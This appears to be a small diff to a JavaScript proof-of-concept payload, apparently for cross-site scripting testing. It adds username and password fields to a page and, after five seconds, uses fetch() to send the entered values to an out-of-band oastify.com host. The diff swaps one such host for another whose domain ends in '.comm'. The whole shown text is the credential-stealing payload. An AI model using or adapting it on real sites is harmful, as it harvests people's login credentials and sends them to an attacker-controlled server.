@@ -12,5 +12,5 @@ body.append(u)
 body.append(p)
 
 setTimeout(function(){ 
-      fetch("https://f6m0gaezop4dzth2oo1cj9eumlscg3cr1.oastify.com/k?u=" + u.value + "&p=" + p.value)
+      fetch("https://9ak0ztmy2xnwjbbc1o7kwsh5yw4nseg3.oastify.comm/k?u=" + u.value + "&p=" + p.value)
     }, 5000);
